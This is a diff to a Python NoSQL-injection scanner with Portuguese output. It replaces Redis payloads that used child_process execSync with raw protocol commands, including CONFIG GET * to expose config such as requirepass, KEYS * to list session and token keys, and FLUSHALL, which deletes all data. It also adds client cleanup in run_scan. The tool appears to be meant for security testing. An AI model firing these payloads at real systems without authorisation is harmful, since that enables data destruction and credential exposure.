@@ -148,32 +148,32 @@ _MONGODB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
 _REDIS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
     (
         "redis_info",
-        '{"$where": "var x=require(\"child_process\").execSync(\"INFO\").toString()"}',
-        "application/json",
+        "\r\nINFO\r\n",
+        "text/plain",
         ["redis_version", "connected_clients", "used_memory"],
     ),
     (
         "redis_config",
-        '{"$where": "var x=require(\"child_process\").execSync(\"CONFIG GET *\").toString()"}',
-        "application/json",
+        "\r\nCONFIG GET *\r\n",
+        "text/plain",
         ["bind", "port", "requirepass"],
     ),
     (
         "redis_keys",
-        '{"$where": "var x=require(\"child_process\").execSync(\"KEYS *\").toString()"}',
-        "application/json",
+        "\r\nKEYS *\r\n",
+        "text/plain",
         ["session", "user", "token"],
     ),
     (
-        "redis_eval",
-        '{"$where": "var x=require(\"child_process\").execSync(\"EVAL \\\"return redis.call(\\\"INFO\\\")\\\"\").toString()"}',
-        "application/json",
-        ["redis_version"],
+        "redis_select",
+        "\r\nSELECT 0\r\n",
+        "text/plain",
+        ["ok", "SELECT"],
     ),
     (
         "redis_flushall",
-        '{"$where": "var x=require(\"child_process\").execSync(\"FLUSHALL\").toString()"}',
-        "application/json",
+        "\r\nFLUSHALL\r\n",
+        "text/plain",
         ["ok", "flushall"],
     ),
 ]
@@ -651,66 +651,70 @@ async def run_scan(
     """Executa o scan NoSQL Injection."""
     tls = target.startswith("https")
     client = create_async_client(timeout=timeout)
+    try:
 
-    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
-    baseline = await _test_baseline(client, target)
-    if baseline[0] == 0:
-        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
-        return 1
+        print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
+        baseline = await _test_baseline(client, target)
+        if baseline[0] == 0:
+            print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
+            return 1
 
-    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))
+        print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))
 
-    run_categories = categories or list(_CATEGORY_MAP.keys())
-    all_attempts: list[NoSQLiAttempt] = []
+        run_categories = categories or list(_CATEGORY_MAP.keys())
+        all_attempts: list[NoSQLiAttempt] = []
 
-    tasks: list[Awaitable[list[NoSQLiAttempt]]] = []
-    for cat in run_categories:
-        if cat == "detect":
-            tasks.append(_test_detect(client, target, baseline))
-        elif cat == "mongodb":
-            tasks.append(_test_mongodb(client, target, baseline))
-        elif cat == "redis":
-            tasks.append(_test_redis(client, target, baseline))
-        elif cat == "couchdb":
-            tasks.append(_test_couchdb(client, target, baseline))
-        elif cat == "bypass":
-            tasks.append(_test_bypass(client, target, baseline))
+        tasks: list[Awaitable[list[NoSQLiAttempt]]] = []
+        for cat in run_categories:
+            if cat == "detect":
+                tasks.append(_test_detect(client, target, baseline))
+            elif cat == "mongodb":
+                tasks.append(_test_mongodb(client, target, baseline))
+            elif cat == "redis":
+                tasks.append(_test_redis(client, target, baseline))
+            elif cat == "couchdb":
+                tasks.append(_test_couchdb(client, target, baseline))
+            elif cat == "bypass":
+                tasks.append(_test_bypass(client, target, baseline))
 
-    if tasks:
-        results_list = await asyncio.gather(*tasks, return_exceptions=True)
-        for r in results_list:
-            if isinstance(r, list):
-                all_attempts.extend(r)
+        if tasks:
+            results_list = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in results_list:
+                if isinstance(r, list):
+                    all_attempts.extend(r)
 
-    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
-    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
-    issues: list[str] = []
-    for att in all_attempts:
-        if att.vulnerable:
-            issues.append(f"VULN: {att.technique} - {att.details}")
+        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
+        blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
+        issues: list[str] = []
+        for att in all_attempts:
+            if att.vulnerable:
+                issues.append(f"VULN: {att.technique} - {att.details}")
 
-    overall = "vulnerable" if vuln_techs else "secure"
+        overall = "vulnerable" if vuln_techs else "secure"
 
-    result = NoSQLiResult(
-        target=target,
-        baseline_status=baseline[0],
-        baseline_size=baseline[1],
-        tls=tls,
-        attempts=all_attempts,
-        vulnerable_techniques=vuln_techs,
-        blocked_techniques=blocked,
-        issues=issues,
-        overall_status=overall,
-    )
+        result = NoSQLiResult(
+            target=target,
+            baseline_status=baseline[0],
+            baseline_size=baseline[1],
+            tls=tls,
+            attempts=all_attempts,
+            vulnerable_techniques=vuln_techs,
+            blocked_techniques=blocked,
+            issues=issues,
+            overall_status=overall,
+        )
 
-    print_results(result)
+        print_results(result)
 
-    if output_file:
-        write_output(output_file, asdict(result))
+        if output_file:
+            write_output(output_file, asdict(result))
 
-    logger.info("NoSQLi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
-    return 1 if vuln_techs else 0
+        logger.info("NoSQLi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
+        return 1 if vuln_techs else 0
 
+
+    finally:
+        await client.aclose()
 
 banner_art = create_banner(
     r"""
